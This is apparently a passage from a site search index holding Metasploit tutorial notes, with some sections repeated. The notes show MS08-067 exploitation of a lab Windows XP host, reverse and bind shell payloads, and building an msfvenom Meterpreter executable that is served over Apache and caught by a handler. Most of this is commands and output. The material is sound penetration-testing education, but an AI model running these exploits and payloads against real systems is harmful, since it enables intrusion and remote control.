SMBPIPE BROWSER yes The pipe name to use ( BROWSER , SRVSVC ) Exploit target : Id Name -- ---- 0 Automatic Targeting msf exploit ( ms08_067_netapi ) > RHOST - refers to the remote host to exploit RPORT - refers to the remote port to attack SMBPIPE - used for Windows Interprocess Communication setting remote host 1 msf exploit(ms08_067_netapi) > set RHOST 192.168.20.10 setting remote port 1 msf exploit(ms08_067_netapi) > set RPORT 445 setting SMBPIPE leave it at default exploit target the target operating system and version. view available targets with the following command 1 2 3 4 5 6 7 8 9 10 11 12 13 14 msf exploit(ms08_067_netapi) > show targets Exploit targets: Id Name -- ---- 0 Automatic Targeting 1 Windows 2000 Universal 2 Windows XP SP0/SP1 Universal 3 Windows XP SP2 English (AlwaysOn NX) 4 Windows XP SP2 English (NX) 5 Windows XP SP3 English (AlwaysOn NX) --snip-- 67 Windows 2003 SP2 Spanish (NX) setting the target set the type of target machine 1 msf exploit(ms08_067_netapi) > set target _<target_number>_ Payloads Payloads tell what the system should do after the exploit is successful find compatible payloads use ths show payloads command to see compatible payloads 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 msf exploit(ms08_067_netapi) > show payloads Compatible Payloads =================== Name Disclosure Date Rank Description ---- --------------- ---- ----------- generic/custom normal Custom Payload generic/debug_trap normal Generic x86 Debug Trap generic/shell_bind_tcp normal Generic Command Shell, Bind TCP Inline generic/shell_reverse_tcp normal Generic Command Shell, Reverse Inline generic/tight_loop normal Generic x86 Tight Loop windows/dllinject/bind_ipv6_tcp normal Reflective DLL Injection, Bind TCP Stager (IPv6) windows/dllinject/bind_nonx_tcp normal Reflective DLL Injection, Bind TCP Stager (No NX or Win7) windows/dllinject/bind_tcp normal Reflective DLL Injection, Bind TCP Stager windows/dllinject/reverse_http normal Reflective DLL Injection, Reverse HTTP Stager --snip-- windows/vncinject/reverse_ipv6_http normal VNC Server (Reflective Injection), Reverse HTTP Stager (IPv6) windows/vncinject/reverse_ipv6_tcp normal VNC Server (Reflective Injection), Reverse TCP Stager (IPv6) --snip-- windows/vncinject/reverse_tcp normal VNC Server (Reflective Injection), Reverse TCP Stager windows/vncinject/reverse_tcp_allports normal VNC Server (Reflective Injection), Reverse All-Port TCP Stager windows/vncinject/reverse_tcp_dns normal VNC Server (Reflective Injection), Reverse TCP Stager (DNS) Note If payload is not set, metasploit will automatically choose the default payload and associated settings and run it. Running The Exploit use the exploit command to run the exploit 1 2 3 4 5 6 7 8 9 10 11 12 msf exploit(ms08_067_netapi) > exploit [*] Started reverse handler on 192.168.20.9:4444 [*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English [*] Selected Target: Windows XP SP3 English (AlwaysOn NX) [*] Attempting to trigger the vulnerability... [*] Sending stage (752128 bytes) to 192.168.20.10 [*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1334) at 2015-08-31 07:37:05 -0400 meterpreter > to exit use the exit command 1 2 3 4 5 meterpreter > exit [*] Shutting down Meterpreter... [*] Meterpreter session 1 closed. Reason: User exit msf exploit(ms08_067_netapi) > Type of Shells Shells fall into two categories bind shells reverse shells Bind Shells A bind shell instructs the target machine to open a command shell and listen on a local port. The attack machine then connects to the target machine on the listening port. Reverse Shells A reverse shell , actively pushes a connection back to the attack machine rather than waiting for an incoming connection. In the attack machine, we open a local port and listen for a connection from our target because this reverse connection is more likely to make it through a firewall. Setting Payload Manually use the set payload command to specify the payload 1 2 msf exploit(ms08_067_netapi) > set payload windows/shell_reverse_tcp payload => windows/shell_reverse_tcp Since a reverse shell is used, specify the local host and port to listen on 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 msf exploit ( ms08_067_netapi ) > show options Module options ( exploit / windows / smb / ms08_067_netapi ): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST 192.168 . 20.10 yes The target address RPORT 445 yes Set the SMB service port SMBPIPE BROWSER yes The pipe name to use ( BROWSER , SRVSVC ) Payload options ( windows / shell_reverse_tcp ): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique : seh , thread , process , none \u2776 LHOST yes The listen address LPORT 4444 yes The listen port Exploit target : Id Name -- ---- 0 Automatic Targeting setting the local host 1 msf exploit(ms08_067_netapi) > set LHOST _<local_host_ip>_ running the exploit again 1 2 3 4 5 6 7 8 9 10 11 12 13 14 msf exploit(ms08_067_netapi) > exploit [*] Started reverse handler on 192.168.20.9:4444 \u2776 [*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English [*] Selected Target: Windows XP SP3 English (AlwaysOn NX) \u2777 [*] Attempting to trigger the vulnerability... [*] Command shell session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1374) at 2015-08-31 10:29:36 -0400 Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\\WINDOWS\\system32> closing the shell To close the shell, type ctrl-C and enter y at the prompt to abort the session. 1 2 3 4 5 C:\\WINDOWS\\system32>^C Abort session 2? [y/N] y [*] Command shell session 2 closed. Reason: User exit msf exploit(ms08_067_netapi) > Msfcli Msfcli is a command line interface. Used particularly when metasploit is used within scripts and for testing metasploit modules getting help for msfcli use the -h flag to get help on the msfcli command 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root@kali:~# msfcli -h \u2776 Usage: /opt/metasploit/apps/pro/msf3/msfcli <exploit_name> <option=value> [mode] ============================================================================== Mode Description ---- ----------- (A)dvanced Show available advanced options for this module (AC)tions Show available actions for this auxiliary module (C)heck Run the check routine of the selected module (E)xecute Execute the selected module (H)elp You're looking at it baby! (I)DS Evasion Show available ids evasion options for this module \u2777(O)ptions Show available options for this module \u2778(P)ayloads Show available payloads for this module (S)ummary Show information about this module (T)argets Show available targets for this exploit module useful modes in msfcli msfcli has some modes built-in to build the final command o mode shows the selected module's options P shows the compatible payloads showing options 1 2 3 4 5 6 7 8 root@kali:~# msfcli windows/smb/ms08_067_netapi O [*] Please wait while we load the module tree... Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes Set the SMB service port SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC) setting host 1 root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 showing payloads P shows the compatible payloads 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P [*] Please wait while we load the module tree... Compatible payloads =================== Name Description ---- ----------- generic/custom Use custom string or file as payload. Set either PAYLOADFILE or PAYLOADSTR. generic/debug_trap Generate a debug trap in the target process generic/shell_bind_tcp Listen for a connection and spawn a command shell generic/shell_reverse_tcp Connect back to attacker and spawn a command shell generic/tight_loop Generate a tight loop in the target process --snip-- setting payloads 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 PAYLOAD=windows/shell_bind_tcp [*] Please wait while we load the module tree... RHOST => 192.168.20.10 PAYLOAD => windows/shell_bind_tcp [*] Started bind handler \u2776 [*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English [*] Selected Target: Windows XP SP3 English (AlwaysOn NX) [*] Attempting to trigger the vulnerability... [*] Command shell session 1 opened (192.168.20.9:35156 -> 192.168.20.10:4444) at 2015-08-31 16:43:54 -0400 Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\\WINDOWS\\system32> running the exploit use the E flag to tell msfcli to run the exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 PAYLOAD=windows/shell_bind_tcp E [*] Please wait while we load the module tree... RHOST => 192.168.20.10 PAYLOAD => windows/shell_bind_tcp [*] Started bind handler \u2776 [*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English [*] Selected Target: Windows XP SP3 English (AlwaysOn NX) [*] Attempting to trigger the vulnerability... [*] Command shell session 1 opened (192.168.20.9:35156 -> 192.168.20.10:4444) at 2015-08-31 16:43:54 -0400 Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\\WINDOWS\\system32> Creating Standalone Payloads With Msfvenom view the help page of msfvenom 1 root@kali:~# msfvenom - h listing all payloads 1 root@kali:~# msfvenom -l payloads setting payload use the -p flag to set the payload 1 root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp setting options use the -o flag to set the options 1 2 3 4 5 6 7 8 9 root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -o [*] Options for payload/windows/meterpreter/reverse_tcp Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique: seh, thread, process, none LHOST yes The listen address LPORT 4444 yes The listen port set the LHOST using the option LHOST=12345 choosing the output format use the command msfvenom --help-formats to show the output formats 1 2 3 4 5 6 7 root@kali:~# msfvenom --help-formats Executable formats asp, aspx, aspx-exe, dll, elf, exe, exe-only, exe-service, exe-small, loop-vbs, macho, msi, msi-nouac, psh, psh-net, vba, vba-exe, vbs, war Transform formats bash, c, csharp, dw, dword, java, js_be, js_le, num, perl, pl, powershell, psl, py, python, raw, rb, ruby, sh, vbapplication, vbscript selecting the output format use the -f flag to set the output format 1 root@kali:~# msfvenom windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe redirecting the output to a file 1 root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe > chapter4example.exe There is no output to the screen, but if we run the file command on our newly created executable file, we see that it\u2019s a Windows executable that will run on any Windows system as long as a user attempts to run it. Serving Payloads upload the payload to the webserver 1 2 3 root@kali:~# cp chapter4example.exe /var/www root@kali:~# service apache2 start Starting web server apache2 browse the target machine and point the browser to the following url to http://192.168.20.9/chapter4example.exe and download the file. Before executing the file, a handler needs to be configured. using the multi/handler module allows to set up standalone handlers. We need to catch the meterpreter connection when the malicious executable is executed from the target machine. using the multi/handle module 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 msf > use multi / handler msf exploit ( handler ) > set PAYLOAD windows / meterpreter / reverse_tcp PAYLOAD => windows / meterpreter / reverse_tcp msf exploit ( handler ) > show options Module options ( exploit / multi / handler ): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options ( windows / meterpreter / reverse_tcp ): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique : seh , thread , process , none LHOST yes The listen address LPORT 4444 yes The listen port -- snip -- msf exploit ( handler ) > set the LHOST and the LPORT using the following commands 1 2 3 4 5 6 7 8 msf exploit(handler) > set LHOST 192.168.20.9 LHOST => 192.168.20.9 msf exploit(handler) > set LPORT 12345 LPORT => 12345 msf exploit(handler) > exploit [*] Started reverse handler on 192.168.20.9:12345 [*] Starting the payload handler... now the handler is listening ... login to the target machine and run the executable - we get the following shell 1 2 3 4 [*] Sending stage (752128 bytes) to 192.168.20.10 [*] Meterpreter session 1 opened (192.168.20.9:12345 -> 192.168.20.10:49437) at 2015-09-01 11:20:00 -0400 meterpreter > Using an Auxiliary Module modules not used for exploitation are called auxiliary modules . They include things like vulnerability scanners, fuzzers and even DoS modules Note A good rule of thumb to remember is that exploit modules use a payload and auxiliary modules do not. auxiliary module to enumerate the listening pipes on a SMB server auxiliary/scanner/smb/pipe_auditor 1 2 3 4 5 6 7 8 9 10 11 12 msf > use scanner / smb / pipe_auditor msf auxiliary ( pipe_auditor ) > show options Module options ( auxiliary / scanner / smb / pipe_auditor ): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier SMBDomain WORKGROUP no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as THREADS 1 yes The number of concurrent threads Multiple remote hosts can be specified The THREADS option allows us to control the speed of Metasploit by having our module run in multiple threads 1 2 msf auxiliary(pipe_auditor) > set RHOSTS 192.168.20.10 RHOSTS => 192.168.20.10 Though nothing is being technically exploited, metasploit can be made to run the auxiliary module using the exploit command 1 2 3 4 5 6 msf auxiliary(pipe_auditor) > exploit [*] 192.168.20.10 - Pipes: \\browser [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(pipe_auditor) > The module audits the listening SMB pipes on the target machine and it turns out that the target has only one SMB pipe i.e. BROWSER Upgrading Metasploit 1 root@kali:~# msfupdate","title":"Metasploit"},{"location":"tools/metasploit/#metasploit_basics","text":"","title":"Metasploit Basics"},{"location":"tools/metasploit/#starting_metasploit","text":"Metasploit uses postgresql as the backend database start the postgresql database 1 root@kali:~# service postgresql start The command creates a postgresql user msf3 and a database to store the data start the webserver 1 root@kali:~# service metasploit start The above command starts metasploit's Remote Procedure Call (RPC) server and web server start the interface There are multiple interfaces to metasploit. msfconsole is a text based interface to metasploit. 1 root@kali:~# msfconsole The above command will start a console 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 , , / \\ ((__---,,,---__)) (_) O O (_)_________ \\ _ / |\\ o_o \\ M S F | \\ \\ _____ | * ||| WW||| ||| ||| Large pentest? List, sort, group, tag and search your hosts and services in Metasploit Pro -- type 'go_pro' to launch it now. =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0] + -- --=[ 1246 exploits - 678 auxiliary - 198 post + -- --=[ 324 payloads - 32 encoders - 8 nops msf > getting help use the help command to get help 1 2 3 4 5 msf > help route Usage: route [add/remove/get/flush/print] subnet netmask [comm/sid] Route traffic destined to a given subnet through a supplied session. The default comm is Local...","title":"Starting Metasploit"},{"location":"tools/metasploit/#finding_metasploit_modules","text":"Metasploit also has an online database of modules ( http://www.rapid7.com/db/modules/ ) and a built-in search function that can be used to search for the correct modules. built-in search searching for a metasploit module - use the search command 1 2 3 4 5 6 7 8 9 10 msf > search ms08-067 Matching Modules ================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- exploit/windows/smb/ms08_067_netapi 2008-10-28 00:00:00 UTC great Microsoft Server Service Relative Path Stack Corruption exploit/windows/smb/ms08_067_netapi is the module name getting more info about the module - use the info command 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 msf > info exploit/windows/smb/ms08_067_netapi \u2776Name: Microsoft Server Service Relative Path Stack Corruption \u2777Module: exploit/windows/smb/ms08_067_netapi Version: 0 \u2778Platform: Windows \u2779Privileged: Yes License: Metasploit Framework License (BSD) \u277aRank: Great \u277b Available targets: Id Name -- ---- 0 Automatic Targeting 1 Windows 2000 Universal 2 Windows XP SP0/SP1 Universal --snip-- 67 Windows 2003 SP2 Spanish (NX) \u277c Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes Set the SMB service port SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC) \u277d Payload information: Space: 400 Avoid: 8 characters \u277e Description: This module exploits a parsing flaw in the path canonicalization code of NetAPI32.dll through the Server Service. This module is capable of bypassing NX on some operating systems and service packs. The correct target must be used to prevent the Server Service (along with a dozen others in the same process) from crashing. Windows XP targets seem to handle multiple successful exploitation events, but 2003 targets will often crash or hang on subsequent attempts. This is just the first version of this module, full support for NX bypass on 2003, along with other platforms, is still in development. \u277f References: http://www.microsoft.com/technet/security/bulletin/MS08-067.mspx","title":"Finding Metasploit Modules"},{"location":"tools/metasploit/#enabling_the_module","text":"use the use command to set the exploit module 1 2 msf > use windows/smb/ms08_067_netapi msf exploit(ms08_067_netapi) >","title":"Enabling The Module"},{"location":"tools/metasploit/#setting_module_options","text":"use the show options command to show the module options that need to be set 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 msf exploit ( ms08_067_netapi ) > show options Module options ( exploit / windows / smb / ms08_067_netapi ): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes Set the SMB service port SMBPIPE BROWSER yes The pipe name to use ( BROWSER , SRVSVC ) Exploit target : Id Name -- ---- 0 Automatic Targeting msf exploit ( ms08_067_netapi ) > RHOST - refers to the remote host to exploit RPORT - refers to the remote port to attack SMBPIPE - used for Windows Interprocess Communication setting remote host 1 msf exploit(ms08_067_netapi) > set RHOST 192.168.20.10 setting remote port 1 msf exploit(ms08_067_netapi) > set RPORT 445 setting SMBPIPE leave it at default exploit target the target operating system and version. view available targets with the following command 1 2 3 4 5 6 7 8 9 10 11 12 13 14 msf exploit(ms08_067_netapi) > show targets Exploit targets: Id Name -- ---- 0 Automatic Targeting 1 Windows 2000 Universal 2 Windows XP SP0/SP1 Universal 3 Windows XP SP2 English (AlwaysOn NX) 4 Windows XP SP2 English (NX) 5 Windows XP SP3 English (AlwaysOn NX) --snip-- 67 Windows 2003 SP2 Spanish (NX) setting the target set the type of target machine 1 msf exploit(ms08_067_netapi) > set target _<target_number>_","title":"Setting Module Options"},{"location":"tools/metasploit/#payloads","text":"Payloads tell what the system should do after the exploit is successful find compatible payloads use ths show payloads command to see compatible payloads 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 msf exploit(ms08_067_netapi) > show payloads Compatible Payloads =================== Name Disclosure Date Rank Description ---- --------------- ---- ----------- generic/custom normal Custom Payload generic/debug_trap normal Generic x86 Debug Trap generic/shell_bind_tcp normal Generic Command Shell, Bind TCP Inline generic/shell_reverse_tcp normal Generic Command Shell, Reverse Inline generic/tight_loop normal Generic x86 Tight Loop windows/dllinject/bind_ipv6_tcp normal Reflective DLL Injection, Bind TCP Stager (IPv6) windows/dllinject/bind_nonx_tcp normal Reflective DLL Injection, Bind TCP Stager (No NX or Win7) windows/dllinject/bind_tcp normal Reflective DLL Injection, Bind TCP Stager windows/dllinject/reverse_http normal Reflective DLL Injection, Reverse HTTP Stager --snip-- windows/vncinject/reverse_ipv6_http normal VNC Server (Reflective Injection), Reverse HTTP Stager (IPv6) windows/vncinject/reverse_ipv6_tcp normal VNC Server (Reflective Injection), Reverse TCP Stager (IPv6) --snip-- windows/vncinject/reverse_tcp normal VNC Server (Reflective Injection), Reverse TCP Stager windows/vncinject/reverse_tcp_allports normal VNC Server (Reflective Injection), Reverse All-Port TCP Stager windows/vncinject/reverse_tcp_dns normal VNC Server (Reflective Injection), Reverse TCP Stager (DNS) Note If payload is not set, metasploit will automatically choose the default payload and associated settings and run it.","title":"Payloads"},{"location":"tools/metasploit/#running_the_exploit","text":"use the exploit command to run the exploit 1 2 3 4 5 6 7 8 9 10 11 12 msf exploit(ms08_067_netapi) > exploit [*] Started reverse handler on 192.168.20.9:4444 [*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English [*] Selected Target: Windows XP SP3 English (AlwaysOn NX) [*] Attempting to trigger the vulnerability... [*] Sending stage (752128 bytes) to 192.168.20.10 [*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1334) at 2015-08-31 07:37:05 -0400 meterpreter > to exit use the exit command 1 2 3 4 5 meterpreter > exit [*] Shutting down Meterpreter... [*] Meterpreter session 1 closed. Reason: User exit msf exploit(ms08_067_netapi) >","title":"Running The Exploit"},{"location":"tools/metasploit/#type_of_shells","text":"Shells fall into two categories bind shells reverse shells Bind Shells A bind shell instructs the target machine to open a command shell and listen on a local port. The attack machine then connects to the target machine on the listening port. Reverse Shells A reverse shell , actively pushes a connection back to the attack machine rather than waiting for an incoming connection. In the attack machine, we open a local port and listen for a connection from our target because this reverse connection is more likely to make it through a firewall.","title":"Type of Shells"},{"location":"tools/metasploit/#setting_payload_manually","text":"use the set payload command to specify the payload 1 2 msf exploit(ms08_067_netapi) > set payload windows/shell_reverse_tcp payload => windows/shell_reverse_tcp Since a reverse shell is used, specify the local host and port to listen on 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 msf exploit ( ms08_067_netapi ) > show options Module options ( exploit / windows / smb / ms08_067_netapi ): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST 192.168 . 20.10 yes The target address RPORT 445 yes Set the SMB service port SMBPIPE BROWSER yes The pipe name to use ( BROWSER , SRVSVC ) Payload options ( windows / shell_reverse_tcp ): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique : seh , thread , process , none \u2776 LHOST yes The listen address LPORT 4444 yes The listen port Exploit target : Id Name -- ---- 0 Automatic Targeting setting the local host 1 msf exploit(ms08_067_netapi) > set LHOST _<local_host_ip>_ running the exploit again 1 2 3 4 5 6 7 8 9 10 11 12 13 14 msf exploit(ms08_067_netapi) > exploit [*] Started reverse handler on 192.168.20.9:4444 \u2776 [*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English [*] Selected Target: Windows XP SP3 English (AlwaysOn NX) \u2777 [*] Attempting to trigger the vulnerability... [*] Command shell session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1374) at 2015-08-31 10:29:36 -0400 Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\\WINDOWS\\system32> closing the shell To close the shell, type ctrl-C and enter y at the prompt to abort the session. 1 2 3 4 5 C:\\WINDOWS\\system32>^C Abort session 2? [y/N] y [*] Command shell session 2 closed. Reason: User exit msf exploit(ms08_067_netapi) >","title":"Setting Payload Manually"},{"location":"tools/metasploit/#msfcli","text":"Msfcli is a command line interface. Used particularly when metasploit is used within scripts and for testing metasploit modules getting help for msfcli use the -h flag to get help on the msfcli command 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root@kali:~# msfcli -h \u2776 Usage: /opt/metasploit/apps/pro/msf3/msfcli <exploit_name> <option=value> [mode] ============================================================================== Mode Description ---- ----------- (A)dvanced Show available advanced options for this module (AC)tions Show available actions for this auxiliary module (C)heck Run the check routine of the selected module (E)xecute Execute the selected module (H)elp You're looking at it baby! (I)DS Evasion Show available ids evasion options for this module \u2777(O)ptions Show available options for this module \u2778(P)ayloads Show available payloads for this module (S)ummary Show information about this module (T)argets Show available targets for this exploit module useful modes in msfcli msfcli has some modes built-in to build the final command o mode shows the selected module's options P shows the compatible payloads showing options 1 2 3 4 5 6 7 8 root@kali:~# msfcli windows/smb/ms08_067_netapi O [*] Please wait while we load the module tree... Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes Set the SMB service port SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC) setting host 1 root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 showing payloads P shows the compatible payloads 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P [*] Please wait while we load the module tree... Compatible payloads =================== Name Description ---- ----------- generic/custom Use custom string or file as payload. Set either PAYLOADFILE or PAYLOADSTR. generic/debug_trap Generate a debug trap in the target process generic/shell_bind_tcp Listen for a connection and spawn a command shell generic/shell_reverse_tcp Connect back to attacker and spawn a command shell generic/tight_loop Generate a tight loop in the target process --snip-- setting payloads 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 PAYLOAD=windows/shell_bind_tcp [*] Please wait while we load the module tree... RHOST => 192.168.20.10 PAYLOAD => windows/shell_bind_tcp [*] Started bind handler \u2776 [*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English [*] Selected Target: Windows XP SP3 English (AlwaysOn NX) [*] Attempting to trigger the vulnerability... [*] Command shell session 1 opened (192.168.20.9:35156 -> 192.168.20.10:4444) at 2015-08-31 16:43:54 -0400 Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\\WINDOWS\\system32> running the exploit use the E flag to tell msfcli to run the exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 PAYLOAD=windows/shell_bind_tcp E [*] Please wait while we load the module tree... RHOST => 192.168.20.10 PAYLOAD => windows/shell_bind_tcp [*] Started bind handler \u2776 [*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English [*] Selected Target: Windows XP SP3 English (AlwaysOn NX) [*] Attempting to trigger the vulnerability... [*] Command shell session 1 opened (192.168.20.9:35156 -> 192.168.20.10:4444) at 2015-08-31 16:43:54 -0400 Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\\WINDOWS\\system32>","title":"Msfcli"},{"location":"tools/metasploit/#creating_standalone_payloads_with_msfvenom","text":"view the help page of msfvenom 1 root@kali:~# msfvenom - h listing all payloads 1 root@kali:~# msfvenom -l payloads setting payload use the -p flag to set the payload 1 root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp setting options use the -o flag to set the options 1 2 3 4 5 6 7 8 9 root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -o [*] Options for payload/windows/meterpreter/reverse_tcp Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique: seh, thread, process, none LHOST yes The listen address LPORT 4444 yes The listen port set the LHOST using the option LHOST=12345 choosing the output format use the command msfvenom --help-formats to show the output formats 1 2 3 4 5 6 7 root@kali:~# msfvenom --help-formats Executable formats asp, aspx, aspx-exe, dll, elf, exe, exe-only, exe-service, exe-small, loop-vbs, macho, msi, msi-nouac, psh, psh-net, vba, vba-exe, vbs, war Transform formats bash, c, csharp, dw, dword, java, js_be, js_le, num, perl, pl, powershell, psl, py, python, raw, rb, ruby, sh, vbapplication, vbscript selecting the output format use the -f flag to set the output format 1 root@kali:~# msfvenom windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe redirecting the output to a file 1 root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe > chapter4example.exe There is no output to the screen, but if we run the file command on our newly created executable file, we see that it\u2019s a Windows executable that will run on any Windows system as long as a user attempts to run it.","title":"Creating Standalone Payloads With Msfvenom"},{"location":"tools/metasploit/#serving_payloads","text":"upload the payload to the webserver 1 2 3 root@kali:~# cp chapter4example.exe /var/www root@kali:~# service apache2 start Starting web server apache2 browse the target machine and point the browser to the following url to http://192.168.20.9/chapter4example.exe and download the file. Before executing the file, a handler needs to be configured. using the multi/handler module allows to set up standalone handlers. We need to catch the meterpreter connection when the malicious executable is executed from the target machine. using the multi/handle module 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 msf > use multi / handler msf exploit ( handler ) > set PAYLOAD windows / meterpreter / reverse_tcp PAYLOAD => windows / meterpreter / reverse_tcp msf exploit ( handler ) > show options Module options ( exploit / multi / handler ): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options ( windows / meterpreter / reverse_tcp ): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique : seh , thread , process , none LHOST yes The listen address LPORT 4444 yes The listen port -- snip -- msf exploit ( handler ) > set the LHOST and the LPORT using the following commands 1 2 3 4 5 6 7 8 msf exploit(handler) > set LHOST 192.168.20.9 LHOST => 192.168.20.9 msf exploit(handler) > set LPORT 12345 LPORT => 12345 msf exploit(handler) > exploit [*] Started reverse handler on 192.168.20.9:12345 [*] Starting the payload handler... now the handler is listening ... login to the target machine and run the executable - we get the following shell 1 2 3 4 [*] Sending stage (752128 bytes) to 192.168.20.10 [*] Meterpreter session 1 opened (192.168.20.9:12345 -> 192.168.20.10:49437) at 2015-09-01 11:20:00 -0400 meterpreter >","title":"Serving Payloads"},{"location":"tools/metasploit/#using_an_auxiliary_module","text":"modules not used for exploitation are called auxiliary modules . They include things like vulnerability scanners, fuzzers and even DoS modules Note A good rule of thumb to remember is that exploit modules use a payload and auxiliary modules do not. auxiliary module to enumerate the listening pipes on a SMB server auxiliary/scanner/smb/pipe_auditor 1 2 3 4 5 6 7 8 9 10 11 12 msf > use scanner / smb / pipe_auditor msf auxiliary ( pipe_auditor ) > show options Module options ( auxiliary / scanner / smb / pipe_auditor ): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier SMBDomain WORKGROUP no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as THREADS 1 yes The number of concurrent threads Multiple remote hosts can be specified The THREADS option allows us to control the speed of Metasploit by having our module run in multiple threads 1 2 msf auxiliary(pipe_auditor) > set RHOSTS 192.168.20.10 RHOSTS => 192.168.20.10 Though nothing is being technically exploited, metasploit can be made to run the auxiliary module using the exploit command 1 2 3 4 5 6 msf auxiliary(pipe_auditor) > exploit [*] 192.168.20.10 - Pipes: \\browser [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(pipe_auditor) > The module audits the listening SMB pipes on the target machine and it turns out that the target has only one SMB pipe i.e. BROWSER","title":"Using an Auxiliary Module"},{"location":"tools/metasploit/#upgrading_metasploit","text":"1 root@kali:~# msfupdate","title":"Upgrading Metasploit"}]}